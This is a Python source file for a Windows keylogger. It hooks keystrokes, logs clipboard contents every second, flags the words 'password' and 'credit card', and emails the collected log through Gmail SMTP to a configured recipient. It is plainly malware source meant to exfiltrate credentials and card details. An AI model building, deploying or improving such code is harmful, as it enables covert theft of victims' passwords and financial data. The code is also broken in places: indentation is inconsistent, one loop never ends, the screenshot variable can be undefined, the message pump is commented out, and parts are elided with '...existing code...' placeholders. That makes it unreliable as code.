# import pythoncom
import pyHook
import win32api
import win32con
import win32gui
import win32clipboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import time
import threading
# from PIL import ImageGrab

# Configuration
EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_password'
RECIPIENT_EMAIL = 'recipient@example.com'
SUBJECT = 'Keylogger Report'
KEYWORDS = ['password', 'credit card']
LOG_FILE = 'keylogger.log'
SCREENSHOT_DIR = 'screenshots'
INTERVAL = 60 # seconds

# Function to send email
def send_email(subject, body, attachment_path):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
     part = MIMEBase('application', 'octet-stream')
     with open(attachment_path, 'rb') as file:
        part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(attachment_path)}')
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    text = msg.as_string()
    server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
    server.quit()

# Function to capture keystrokes
def on_keyboard_event(event):
 with open(LOG_FILE, 'a') as f:
  f.write(f'{event.Time}: {event.WindowName} - {event.Key}\n')
 return True

# Function to capture window title
# ...existing code...

# Function to monitor clipboard
def monitor_clipboard():
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
            win32clipboard.CloseClipboard()
            with open(LOG_FILE, 'a') as f:
                f.write(f'Clipboard: {data}\n')
        except Exception as e:  # Broader exception handling; log errors for debugging
            print(f"Clipboard error: {e}")  # Optional: print to console or log
        time.sleep(1)

# ...existing code...

# Function to take screenshot
def take_screenshot(keyword):
 screenshot_path = os.path.join(SCREENSHOT_DIR, f'screenshot_{keyword}_{time.strftime("%Y%m%d_%H%M%S")}.png')
#  ImageGrab.grab().save(screenshot_path, 'png')
 return screenshot_path

# Function to log data and send email
def log_and_send():
 while True:
  with open(LOG_FILE, 'r') as f:
   log_data = f.read()

 for keyword in KEYWORDS:
  if keyword in log_data:
   screenshot_path = take_screenshot(keyword)
 send_email(SUBJECT, log_data, screenshot_path)

 time.sleep(INTERVAL)

# Main function
def main():
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)

 # Set up keylogger
 hm = pyHook.HookManager()
 hm.KeyDown = on_keyboard_event
 hm.HookKeyboard()

 # Start clipboard monitoring
 clipboard_thread = threading.Thread(target=monitor_clipboard)
 clipboard_thread.start()

 # Start logging and email sending
 logging_thread = threading.Thread(target=log_and_send)
 logging_thread.start()

 # Run the message pump
 # pythoncom.PumpMessages()

if __name__ == '__main__':
 main()
